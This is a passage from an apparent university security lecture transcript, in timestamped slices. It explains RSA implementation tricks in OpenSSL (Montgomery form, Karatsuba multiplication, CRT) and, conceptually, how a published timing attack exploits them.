            <slice>
              <time_slice>52:46</time_slice>
              <text_slice>I haven't tired
implementing this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:47</time_slice>
              <text_slice>So maybe there's some deep
reason why this extractor</text_slice>
            </slice>
            <slice>
              <time_slice>52:49</time_slice>
              <text_slice>reduction has to happen.</text_slice>
            </slice>
            <slice>
              <time_slice>52:50</time_slice>
              <text_slice>I couldn't think of one.</text_slice>
            </slice>
            <slice>
              <time_slice>52:53</time_slice>
              <text_slice>All right, questions?</text_slice>
            </slice>
            <slice>
              <time_slice>52:57</time_slice>
              <text_slice>So here's the last piece of
the puzzle for how OpenSSL,</text_slice>
            </slice>
            <slice>
              <time_slice>53:00</time_slice>
              <text_slice>this library that this
paper attacks implements</text_slice>
            </slice>
            <slice>
              <time_slice>53:06</time_slice>
              <text_slice>multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>53:07</time_slice>
              <text_slice>So this Montgomery trick is
great for avoiding the mod q</text_slice>
            </slice>
            <slice>
              <time_slice>53:12</time_slice>
              <text_slice>part during modular
multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>53:15</time_slice>
              <text_slice>But then there's a question
of how do you actually</text_slice>
            </slice>
            <slice>
              <time_slice>53:17</time_slice>
              <text_slice>multiply two numbers together.</text_slice>
            </slice>
            <slice>
              <time_slice>53:19</time_slice>
              <text_slice>So we're doing lower
and lower level.</text_slice>
            </slice>
            <slice>
              <time_slice>53:21</time_slice>
              <text_slice>So suppose you have
[? the raw ?] multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>53:28</time_slice>
              <text_slice>So this is not even
modular multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>53:30</time_slice>
              <text_slice>You have two numbers, a and b.</text_slice>
            </slice>
            <slice>
              <time_slice>53:33</time_slice>
              <text_slice>And both these guys
are 512 bit numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>53:38</time_slice>
              <text_slice>How do you multiply
them together</text_slice>
            </slice>
            <slice>
              <time_slice>53:40</time_slice>
              <text_slice>when your machine is
only a 32 bit machine,</text_slice>
            </slice>
            <slice>
              <time_slice>53:42</time_slice>
              <text_slice>like the guys in the paper, or
a 64 bit, but still, same thing?</text_slice>
            </slice>
            <slice>
              <time_slice>53:46</time_slice>
              <text_slice>How would you implement
multiplication of these guys?</text_slice>
            </slice>
            <slice>
              <time_slice>53:53</time_slice>
              <text_slice>Any suggestions?</text_slice>
            </slice>
            <slice>
              <time_slice>53:56</time_slice>
              <text_slice>Well I guess it was a
straightforward question,</text_slice>
            </slice>
            <slice>
              <time_slice>53:58</time_slice>
              <text_slice>you just represent a and
b as a sequence of machine</text_slice>
            </slice>
            <slice>
              <time_slice>54:01</time_slice>
              <text_slice>[? words. ?] And then you
just do this quadratic product</text_slice>
            </slice>
            <slice>
              <time_slice>54:05</time_slice>
              <text_slice>of these two guys.</text_slice>
            </slice>
            <slice>
              <time_slice>54:06</time_slice>
              <text_slice>[INAUDIBLE] see a simple
example, instead of thinking</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>of a 512 bit number, let's think
of these guys as 64 bit numbers</text_slice>
            </slice>
            <slice>
              <time_slice>54:13</time_slice>
              <text_slice>and we're on a 32 bit machine.</text_slice>
            </slice>
            <slice>
              <time_slice>54:15</time_slice>
              <text_slice>Right.</text_slice>
            </slice>
            <slice>
              <time_slice>54:16</time_slice>
              <text_slice>So we're going to have values.</text_slice>
            </slice>
            <slice>
              <time_slice>54:17</time_slice>
              <text_slice>The value of a is going
to be represented by two</text_slice>
            </slice>
            <slice>
              <time_slice>54:20</time_slice>
              <text_slice>[? very ?] different things.</text_slice>
            </slice>
            <slice>
              <time_slice>54:21</time_slice>
              <text_slice>It's going to be, let's
call it, a1 and a0.</text_slice>
            </slice>
            <slice>
              <time_slice>54:27</time_slice>
              <text_slice>So a0 is the low bit,
a1 is the high bit.</text_slice>
            </slice>
            <slice>
              <time_slice>54:29</time_slice>
              <text_slice>And similarly, we're
going to represent</text_slice>
            </slice>
            <slice>
              <time_slice>54:31</time_slice>
              <text_slice>b as two things, b1 b0.</text_slice>
            </slice>
            <slice>
              <time_slice>54:36</time_slice>
              <text_slice>So then a naive way
to represent a b</text_slice>
            </slice>
            <slice>
              <time_slice>54:39</time_slice>
              <text_slice>is going to be to multiply
all these guys out.</text_slice>
            </slice>
            <slice>
              <time_slice>54:44</time_slice>
              <text_slice>So it's going to be
a three cell number.</text_slice>
            </slice>
            <slice>
              <time_slice>54:48</time_slice>
              <text_slice>The high bit is
going to be a1 b1.</text_slice>
            </slice>
            <slice>
              <time_slice>54:52</time_slice>
              <text_slice>The low bit is
going to be a0 b0.</text_slice>
            </slice>
            <slice>
              <time_slice>54:55</time_slice>
              <text_slice>And the middle word is going
to be a1 b0 plus a0 b1.</text_slice>
            </slice>
            <slice>
              <time_slice>55:01</time_slice>
              <text_slice>So this is how you do the
multiplication, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:06</time_slice>
              <text_slice>Question?</text_slice>
            </slice>
            <slice>
              <time_slice>55:06</time_slice>
              <text_slice>AUDIENCE: So I was
going to say are</text_slice>
            </slice>
            <slice>
              <time_slice>55:08</time_slice>
              <text_slice>you using [INAUDIBLE] method?</text_slice>
            </slice>
            <slice>
              <time_slice>55:10</time_slice>
              <text_slice>PROFESSOR: Yeah, so this
is like a clever method</text_slice>
            </slice>
            <slice>
              <time_slice>55:13</time_slice>
              <text_slice>alternative for doing
multiplication, which</text_slice>
            </slice>
            <slice>
              <time_slice>55:15</time_slice>
              <text_slice>doesn't involve four steps.</text_slice>
            </slice>
            <slice>
              <time_slice>55:16</time_slice>
              <text_slice>Here, you have to do
four multiplications.</text_slice>
            </slice>
            <slice>
              <time_slice>55:18</time_slice>
              <text_slice>There's this clever
other method, Karatsuba.</text_slice>
            </slice>
            <slice>
              <time_slice>55:20</time_slice>
              <text_slice>Do they teach this in 601
or something these days?</text_slice>
            </slice>
            <slice>
              <time_slice>55:22</time_slice>
              <text_slice>AUDIENCE: 042.</text_slice>
            </slice>
            <slice>
              <time_slice>55:23</time_slice>
              <text_slice>PROFESSOR: 042, excellent.</text_slice>
            </slice>
            <slice>
              <time_slice>55:24</time_slice>
              <text_slice>Yeah, that's a very nice method.</text_slice>
            </slice>
            <slice>
              <time_slice>55:25</time_slice>
              <text_slice>Almost every cryptographic
library implements this.</text_slice>
            </slice>
            <slice>
              <time_slice>55:29</time_slice>
              <text_slice>And for those of
you that, I guess,</text_slice>
            </slice>
            <slice>
              <time_slice>55:32</time_slice>
              <text_slice>weren't undergrads here, since
we have grad students maybe</text_slice>
            </slice>
            <slice>
              <time_slice>55:34</time_slice>
              <text_slice>they haven't seen Karatsuba.</text_slice>
            </slice>
            <slice>
              <time_slice>55:35</time_slice>
              <text_slice>I'll just write it
out on the board.</text_slice>
            </slice>
            <slice>
              <time_slice>55:37</time_slice>
              <text_slice>It's a clever thing the
first time you see it.</text_slice>
            </slice>
            <slice>
              <time_slice>55:40</time_slice>
              <text_slice>And what you can do is basically
compute out three values.</text_slice>
            </slice>
            <slice>
              <time_slice>55:46</time_slice>
              <text_slice>You're going to
compute out a1 b1.</text_slice>
            </slice>
            <slice>
              <time_slice>55:49</time_slice>
              <text_slice>You're going to also
compute a1 minus b0 times b1</text_slice>
            </slice>
            <slice>
              <time_slice>55:59</time_slice>
              <text_slice>minus-- sorry-- a1
minus a0, b1 minus b0.</text_slice>
            </slice>
            <slice>
              <time_slice>56:04</time_slice>
              <text_slice>And a0 b0.</text_slice>
            </slice>
            <slice>
              <time_slice>56:08</time_slice>
              <text_slice>And this does three
multiplications</text_slice>
            </slice>
            <slice>
              <time_slice>56:11</time_slice>
              <text_slice>instead of four.</text_slice>
            </slice>
            <slice>
              <time_slice>56:12</time_slice>
              <text_slice>And it turns out
you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>56:13</time_slice>
              <text_slice>reconstruct this value from
these three multiplication</text_slice>
            </slice>
            <slice>
              <time_slice>56:18</time_slice>
              <text_slice>results.</text_slice>
            </slice>
            <slice>
              <time_slice>56:20</time_slice>
              <text_slice>And the particular
way to do it is this</text_slice>
            </slice>
            <slice>
              <time_slice>56:22</time_slice>
              <text_slice>is going to be the--
let me write it out</text_slice>
            </slice>
            <slice>
              <time_slice>56:29</time_slice>
              <text_slice>in a different form.</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>So we're going to have 2 to the
64 times-- sorry-- 2 to the 64</text_slice>
            </slice>
            <slice>
              <time_slice>56:41</time_slice>
              <text_slice>plus 2 to the 32
times a1 b1 plus 2</text_slice>
            </slice>
            <slice>
              <time_slice>56:52</time_slice>
              <text_slice>to the 32 times minus that
little guy in the middle a1</text_slice>
            </slice>
            <slice>
              <time_slice>57:00</time_slice>
              <text_slice>minus a0 b1 minus b0.</text_slice>
            </slice>
            <slice>
              <time_slice>57:05</time_slice>
              <text_slice>And finally, we're going to do
2 to the 32 plus 1 times a0 b0.</text_slice>
            </slice>
            <slice>
              <time_slice>57:15</time_slice>
              <text_slice>And it's a little
messy, but actually</text_slice>
            </slice>
            <slice>
              <time_slice>57:16</time_slice>
              <text_slice>if you work through
the details, you'll</text_slice>
            </slice>
            <slice>
              <time_slice>57:19</time_slice>
              <text_slice>end up convincing
yourself hopefully</text_slice>
            </slice>
            <slice>
              <time_slice>57:20</time_slice>
              <text_slice>that this value is exactly
the same as this value.</text_slice>
            </slice>
            <slice>
              <time_slice>57:26</time_slice>
              <text_slice>So it's a clever.</text_slice>
            </slice>
            <slice>
              <time_slice>57:27</time_slice>
              <text_slice>But nonetheless, it saves
you one multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>57:31</time_slice>
              <text_slice>And the way we
apply this to doing</text_slice>
            </slice>
            <slice>
              <time_slice>57:34</time_slice>
              <text_slice>much larger multiplications
is that you recursively</text_slice>
            </slice>
            <slice>
              <time_slice>57:37</time_slice>
              <text_slice>keep going down.</text_slice>
            </slice>
            <slice>
              <time_slice>57:38</time_slice>
              <text_slice>So if you have 512
bit values, you</text_slice>
            </slice>
            <slice>
              <time_slice>57:41</time_slice>
              <text_slice>could break it down to
256 bit multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>57:44</time_slice>
              <text_slice>You do three 256
bit multiplications.</text_slice>
            </slice>
            <slice>
              <time_slice>57:47</time_slice>
              <text_slice>And then each of
those you're going</text_slice>
            </slice>
            <slice>
              <time_slice>57:49</time_slice>
              <text_slice>to do using the same
Karatsuba trick recursively.</text_slice>
            </slice>
            <slice>
              <time_slice>57:52</time_slice>
              <text_slice>And eventually you'll get
down to machine size, which</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>you can just do with
a single machine</text_slice>
            </slice>
            <slice>
              <time_slice>57:56</time_slice>
              <text_slice>instruction. [INAUDIBLE]
This make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>58:02</time_slice>
              <text_slice>So what's the
timing attack here?</text_slice>
            </slice>
            <slice>
              <time_slice>58:04</time_slice>
              <text_slice>How do these guys exploit
this Karatsuba multiplication?</text_slice>
            </slice>
            <slice>
              <time_slice>58:07</time_slice>
              <text_slice>Well, it turns out
that OpenSSL worries</text_slice>
            </slice>
            <slice>
              <time_slice>58:11</time_slice>
              <text_slice>about basically two
kinds of multiplications</text_slice>
            </slice>
            <slice>
              <time_slice>58:13</time_slice>
              <text_slice>that you might need to do.</text_slice>
            </slice>
            <slice>
              <time_slice>58:15</time_slice>
              <text_slice>One is a multiplication
between two large numbers</text_slice>
            </slice>
            <slice>
              <time_slice>58:18</time_slice>
              <text_slice>that are about the same size.</text_slice>
            </slice>
            <slice>
              <time_slice>58:19</time_slice>
              <text_slice>So this happens a
lot when we're doing</text_slice>
            </slice>
            <slice>
              <time_slice>58:22</time_slice>
              <text_slice>this modular exponentiation
because all the values we're</text_slice>
            </slice>
            <slice>
              <time_slice>58:25</time_slice>
              <text_slice>going to be multiplying
are all going</text_slice>
            </slice>
            <slice>
              <time_slice>58:26</time_slice>
              <text_slice>to be roughly 512 bits in size.</text_slice>
            </slice>
            <slice>
              <time_slice>58:29</time_slice>
              <text_slice>So when we're multiplying by c
to the y or doing a squaring,</text_slice>
            </slice>
            <slice>
              <time_slice>58:33</time_slice>
              <text_slice>we're multiplying two things
that are about the same size.</text_slice>
            </slice>
            <slice>
              <time_slice>58:35</time_slice>
              <text_slice>And then this Karatsuba
trick makes a lot of sense</text_slice>
            </slice>
            <slice>
              <time_slice>58:38</time_slice>
              <text_slice>because, instead
of computing stuff</text_slice>
            </slice>
            <slice>
              <time_slice>58:41</time_slice>
              <text_slice>in times squared
of the input size,</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>Karatsuba is roughly n to the
1.58, something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>58:48</time_slice>
              <text_slice>So it's much faster.</text_slice>
            </slice>
            <slice>
              <time_slice>58:50</time_slice>
              <text_slice>But then there's
this other situation</text_slice>
            </slice>
            <slice>
              <time_slice>58:52</time_slice>
              <text_slice>where OpenSSL might be
multiplying two numbers that</text_slice>
            </slice>
            <slice>
              <time_slice>58:54</time_slice>
              <text_slice>are very different in
size: one that's very big,</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>and one that's very small.</text_slice>
            </slice>
            <slice>
              <time_slice>58:58</time_slice>
              <text_slice>And in that case you
could use Karatsuba,</text_slice>
            </slice>
            <slice>
              <time_slice>59:00</time_slice>
              <text_slice>but then it's going
to get you slower</text_slice>
            </slice>
            <slice>
              <time_slice>59:02</time_slice>
              <text_slice>than doing the naive thing.</text_slice>
            </slice>
            <slice>
              <time_slice>59:04</time_slice>
              <text_slice>Suppose you're trying
to multiply a 512 bit</text_slice>
            </slice>
            <slice>
              <time_slice>59:06</time_slice>
              <text_slice>number by a 64 bit
number, you'd rather just</text_slice>
            </slice>
            <slice>
              <time_slice>59:08</time_slice>
              <text_slice>do the straightforward
thing, where you just</text_slice>
            </slice>
            <slice>
              <time_slice>59:10</time_slice>
              <text_slice>multiply by each of the
things in the 64 bit</text_slice>
            </slice>
            <slice>
              <time_slice>59:13</time_slice>
              <text_slice>number plus 2n instead of
n to the 1.58 something.</text_slice>
            </slice>
            <slice>
              <time_slice>59:18</time_slice>
              <text_slice>So as a result, the OpenSSL
guys tried to be clever,</text_slice>
            </slice>
            <slice>
              <time_slice>59:21</time_slice>
              <text_slice>and that's where
often problems start.</text_slice>
            </slice>
            <slice>
              <time_slice>59:25</time_slice>
              <text_slice>They decided that
they'll actually</text_slice>
            </slice>
            <slice>
              <time_slice>59:28</time_slice>
              <text_slice>switch dynamically between
this Karatsuba efficient thing</text_slice>
            </slice>
            <slice>
              <time_slice>59:30</time_slice>
              <text_slice>and this sort of grade school
method of multiplication here.</text_slice>
            </slice>
            <slice>
              <time_slice>59:35</time_slice>
              <text_slice>And their heuristic
was basically</text_slice>
            </slice>
            <slice>
              <time_slice>59:37</time_slice>
              <text_slice>if the two things
you're multiplying</text_slice>
            </slice>
            <slice>
              <time_slice>59:39</time_slice>
              <text_slice>are exactly the same
number of machine words,</text_slice>
            </slice>
            <slice>
              <time_slice>59:42</time_slice>
              <text_slice>so they at least
have the same number</text_slice>
            </slice>
            <slice>
              <time_slice>59:44</time_slice>
              <text_slice>of bits up to 32-bit units,
then they'll go to Karatsuba.</text_slice>
            </slice>
            <slice>
              <time_slice>59:48</time_slice>
              <text_slice>And if the two things
they're multiplying</text_slice>
            </slice>
            <slice>
              <time_slice>59:50</time_slice>
              <text_slice>have a different
number or 32 bit units,</text_slice>
            </slice>
            <slice>
              <time_slice>59:52</time_slice>
              <text_slice>then they'll do the quadratic
or straightforward or regular,</text_slice>
            </slice>
            <slice>
              <time_slice>59:57</time_slice>
              <text_slice>normal multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>59:59</time_slice>
              <text_slice>And there you can see if
your number all of a sudden</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:03</time_slice>
              <text_slice>switches to be a
little bit smaller,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:06</time_slice>
              <text_slice>then you're going to switch
from the sufficient thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:08</time_slice>
              <text_slice>to this other
multiplication method.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:11</time_slice>
              <text_slice>And presumably, the
cutoff point isn't</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:14</time_slice>
              <text_slice>going to be exactly
smooth so you'll</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:15</time_slice>
              <text_slice>be able to tell all
of a sudden, it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:17</time_slice>
              <text_slice>now taking a lot
longer to multiply</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:19</time_slice>
              <text_slice>or a lot shorter to
multiply than before.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:22</time_slice>
              <text_slice>And that's what these guys
exploit in their timing attack</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:26</time_slice>
              <text_slice>again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:26</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:28</time_slice>
              <text_slice>What's going on with the
[INAUDIBLE] All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:32</time_slice>
              <text_slice>So I think I'm now
done with telling you</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:34</time_slice>
              <text_slice>about all the weird
implementation</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:36</time_slice>
              <text_slice>tricks that people play when
implementing RSA in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:39</time_slice>
              <text_slice>So now let's try to
put them back together</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:41</time_slice>
              <text_slice>into an entire web
server and figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:44</time_slice>
              <text_slice>how do you [? tickle ?]
all these interesting bits</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:48</time_slice>
              <text_slice>of the implementation from
the input network packet.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:52</time_slice>
              <text_slice>So what happens
in a web server is</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:54</time_slice>
              <text_slice>that the web server, if
you remember from the HTTPS</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:59</time_slice>
              <text_slice>lecture, has a secret key.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:01</time_slice>
              <text_slice>And it uses the
secret key to prove</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:04</time_slice>
              <text_slice>that it's the
correct owner of all</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:06</time_slice>
              <text_slice>that certificate in the
HTTPS protocol or in TLS.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:11</time_slice>
              <text_slice>And they way this works is that
the clients send some randomly</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:15</time_slice>
              <text_slice>chosen bits, and the
bits are encrypted</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:19</time_slice>
              <text_slice>using the server's public key.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:21</time_slice>
              <text_slice>And the server in this TLS
protocol decrypts this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:24</time_slice>
              <text_slice>And if the message
checks out, it</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:26</time_slice>
              <text_slice>uses those random bits to
establish a [? session ?].</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:29</time_slice>
              <text_slice>But in this case, the message
isn't going to check out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:32</time_slice>
              <text_slice>The message is going
to be carefully chosen,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:34</time_slice>
              <text_slice>the padding bits
aren't going to match,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:35</time_slice>
              <text_slice>and the server is
going to return error</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:37</time_slice>
              <text_slice>as soon as it finishes
encrypting our message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:39</time_slice>
              <text_slice>And that's what we're
going to time here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:42</time_slice>
              <text_slice>So the server-- you can think of
this is Apache with open SSL--</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:49</time_slice>
              <text_slice>you're going to get a
message from the client,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:52</time_slice>
              <text_slice>and you can think of
this as a ciphertext</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:55</time_slice>
              <text_slice>c, or a hypothetical
ciphertext, that the client</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:59</time_slice>
              <text_slice>might have produced.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:00</time_slice>
              <text_slice>And the first thing we're going
to do with a ciphertext c,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:03</time_slice>
              <text_slice>we want to decrypt it
using roughly this formula.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:06</time_slice>
              <text_slice>And if you remember
the first optimization</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:08</time_slice>
              <text_slice>we're going to apply is the
Chinese Remainder Theorem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:12</time_slice>
              <text_slice>So the first thing
we're going to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:14</time_slice>
              <text_slice>is basically split our
pipeline in two parts.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:16</time_slice>
              <text_slice>We're going to do one thing
mod p another thing mod q</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:20</time_slice>
              <text_slice>and then recombine the
results at the end of the day.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:22</time_slice>
              <text_slice>So the first thing
we're going to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:24</time_slice>
              <text_slice>is, we're actually
going to take c</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:26</time_slice>
              <text_slice>and we're going
to compute, let's</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:28</time_slice>
              <text_slice>call this c0, which is going
to be equal to c mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:35</time_slice>
              <text_slice>And we're also going to have
a different value, let's</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:38</time_slice>
              <text_slice>call it c1, which is
going to be c mod p.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:44</time_slice>
              <text_slice>And then we're going to
do the same thing to each</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:46</time_slice>
              <text_slice>of these values to basically
compute c to the d mod p</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:51</time_slice>
              <text_slice>and c to the d mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:55</time_slice>
              <text_slice>And here we're going to
basically initially we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:58</time_slice>
              <text_slice>going to [? starch. ?]
After CRT, we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:00</time_slice>
              <text_slice>going to switch into
Montgomery representation</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:02</time_slice>
              <text_slice>because that's going to make
our multiplies very fast.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:06</time_slice>
              <text_slice>So the next thing
SSL is going to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:08</time_slice>
              <text_slice>to your number,
it's actually going</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:09</time_slice>
              <text_slice>to compute all the
[INAUDIBLE] at c0 prime,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:12</time_slice>
              <text_slice>which is going to
be c0 times R mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:18</time_slice>
              <text_slice>And the same thing
down here, I'm</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:20</time_slice>
              <text_slice>not going to write
out the pipeline</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:21</time_slice>
              <text_slice>because that'll look the same.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:23</time_slice>
              <text_slice>And then, now that we've
switched into Montgomery form,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:27</time_slice>
              <text_slice>we can finally do
our multiplications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:31</time_slice>
              <text_slice>And here's where we're going
to use the sliding window</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:34</time_slice>
              <text_slice>technique.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:35</time_slice>
              <text_slice>So once we have c
prime, we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:38</time_slice>
              <text_slice>try to compute this prime
exponentiate it to 2d mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:47</time_slice>
              <text_slice>And here, as we're computing
this value to the d,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:52</time_slice>
              <text_slice>we're going to be
using sliding windows.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:53</time_slice>
              <text_slice>So here, we're going
to do sliding windows</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:59</time_slice>
              <text_slice>for the bits in this d exponent.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:03</time_slice>
              <text_slice>And also we're going
to do Karatsuba</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:08</time_slice>
              <text_slice>or regular multiplication
depending on exactly what</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:12</time_slice>
              <text_slice>the size of our operands are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:15</time_slice>
              <text_slice>So if it turns out that the
thing we're multiplying,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:18</time_slice>
              <text_slice>c0 prime and maybe that
previously squared result,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:25</time_slice>
              <text_slice>are the same size, we're
going to do Karatsuba.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:27</time_slice>
              <text_slice>If c0 prime is tiny
but some previous thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:31</time_slice>
              <text_slice>we're multiplying it to is
big , then we're going to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:34</time_slice>
              <text_slice>quadratic multiplication,
normal multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:36</time_slice>
              <text_slice>There's sliding
windows coming in here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:38</time_slice>
              <text_slice>here we also have this Karatsuba
versus normal multiplying.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:45</time_slice>
              <text_slice>And also in this step, the
extra reductions come in.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:49</time_slice>
              <text_slice>Because at every multiply,
the extra reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:54</time_slice>
              <text_slice>are going to be proportional
to the thing we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>exponentiating mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:00</time_slice>
              <text_slice>[INAUDIBLE] just plug in
the formula over here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:04</time_slice>
              <text_slice>the probability
extra reductions is</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:05</time_slice>
              <text_slice>going to be proportional to
this value of c0 prime mod</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:11</time_slice>
              <text_slice>q divided by 2R.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:19</time_slice>
              <text_slice>So this is where the
really timing sensitive bit</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:21</time_slice>
              <text_slice>is going to come in.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:22</time_slice>
              <text_slice>And there are actually
two effects here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:24</time_slice>
              <text_slice>There's this Karatsuba
versus normal choice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:27</time_slice>
              <text_slice>And then there's the
number of extra reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:29</time_slice>
              <text_slice>you're going to be making.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:32</time_slice>
              <text_slice>So we'll see how we
exploit this in a second,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:34</time_slice>
              <text_slice>but now that you get
this result for mod q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:36</time_slice>
              <text_slice>you're going to get a
similar result mod p,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:39</time_slice>
              <text_slice>you can finally recombine
these guys from the top</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:43</time_slice>
              <text_slice>and the bottom and use CRT.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:46</time_slice>
              <text_slice>And what you get out
from CRT is actually--</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:49</time_slice>
              <text_slice>sorry I guess we need a first
convert it back down into non</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:55</time_slice>
              <text_slice>Montgomery form.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:56</time_slice>
              <text_slice>So we're going to
get first, we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:00</time_slice>
              <text_slice>going to get c0 prime to
the d divided by R mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:09</time_slice>
              <text_slice>And this thing, because c0
prime was c0 times R mod q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:15</time_slice>
              <text_slice>if we do this then we're going
to get back out our value of c</text_slice>
            </slice>
            <slice>
